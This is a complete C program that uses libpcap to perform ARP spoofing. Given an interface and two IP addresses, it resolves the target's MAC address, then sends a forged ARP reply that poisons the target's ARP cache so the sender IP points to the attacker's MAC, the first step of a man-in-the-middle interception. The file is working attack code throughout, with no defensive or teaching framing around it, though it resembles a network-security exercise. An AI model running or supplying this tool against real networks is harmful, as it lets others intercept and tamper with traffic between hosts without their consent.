#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ARP_REQUEST 1
#define ARP_REPLY 2

typedef struct arp_header {
    u_int16_t htype;
    u_int16_t ptype;
    u_int8_t hlen;
    u_int8_t plen;
    u_int16_t opcode;
    u_int8_t sender_mac[6];
    u_int8_t sender_ip[4];
    u_int8_t target_mac[6];
    u_int8_t target_ip[4];
} arp_header;

void get_mac_address(char *iface, u_int8_t *mac) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

void send_arp_request(pcap_t *handle, u_int8_t *attacker_mac, struct in_addr *target_ip) {
    arp_header arp;
    u_int8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    arp.htype = htons(1);
    arp.ptype = htons(0x0800);
    arp.hlen = 6;
    arp.plen = 4;
    arp.opcode = htons(ARP_REQUEST);
    memcpy(arp.sender_mac, attacker_mac, 6);
    memset(arp.sender_ip, 0, 4);
    memcpy(arp.target_mac, broadcast_mac, 6);
    memcpy(arp.target_ip, target_ip, 4);

    u_int8_t packet[sizeof(struct ether_header) + sizeof(arp_header)];
    struct ether_header *eth = (struct ether_header *) packet;

    memcpy(eth->ether_dhost, broadcast_mac, 6);
    memcpy(eth->ether_shost, attacker_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    memcpy(packet + sizeof(struct ether_header), &arp, sizeof(arp_header));

    pcap_sendpacket(handle, packet, sizeof(packet));
}

void send_arp_infection(pcap_t *handle, u_int8_t *attacker_mac, struct in_addr *sender_ip, struct in_addr *target_ip, u_int8_t *target_mac) {
    arp_header arp;

    arp.htype = htons(1);
    arp.ptype = htons(0x0800);
    arp.hlen = 6;
    arp.plen = 4;
    arp.opcode = htons(ARP_REPLY);
    memcpy(arp.sender_mac, attacker_mac, 6);
    memcpy(arp.sender_ip, target_ip, 4);
    memcpy(arp.target_mac, target_mac, 6);
    memcpy(arp.target_ip, sender_ip, 4);

    u_int8_t packet[sizeof(struct ether_header) + sizeof(arp_header)];
    struct ether_header *eth = (struct ether_header *) packet;

    memcpy(eth->ether_dhost, target_mac, 6);
    memcpy(eth->ether_shost, attacker_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    memcpy(packet + sizeof(struct ether_header), &arp, sizeof(arp_header));

    pcap_sendpacket(handle, packet, sizeof(packet));
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <interface> <sender IP> <target IP>\n", argv[0]);
        return 1;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    u_int8_t attacker_mac[6];
    struct in_addr sender_ip, target_ip;
    arp_header arp;

    inet_aton(argv[2], &sender_ip);
    inet_aton(argv[3], &target_ip);

    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Could not open device %s: %s\n", dev, errbuf);
        return 2;
    }

    get_mac_address(dev, attacker_mac);

    // 공격자의 MAC 주소 출력
    printf("Attacker MAC Address: %02x:%02x:%02x:%02x:%02x:%02x\n",
           attacker_mac[0], attacker_mac[1], attacker_mac[2],
           attacker_mac[3], attacker_mac[4], attacker_mac[5]);

    send_arp_request(handle, attacker_mac, &target_ip);

    struct pcap_pkthdr header;
    const u_char *packet;
    while (1) {
        packet = pcap_next(handle, &header);
        if (packet == NULL) continue;
        struct ether_header *eth = (struct ether_header *) packet;
        if (ntohs(eth->ether_type) != ETHERTYPE_ARP) continue;
        memcpy(&arp, packet + sizeof(struct ether_header), sizeof(arp_header));
        if (ntohs(arp.opcode) != ARP_REPLY) continue;
        if (memcmp(arp.sender_ip, &target_ip, 4) != 0) continue;
        break;
    }

    send_arp_infection(handle, attacker_mac, &sender_ip, &target_ip, arp.sender_mac);

    printf("ARP spoofing packet sent.\n");

    pcap_close(handle);
    return 0;
}

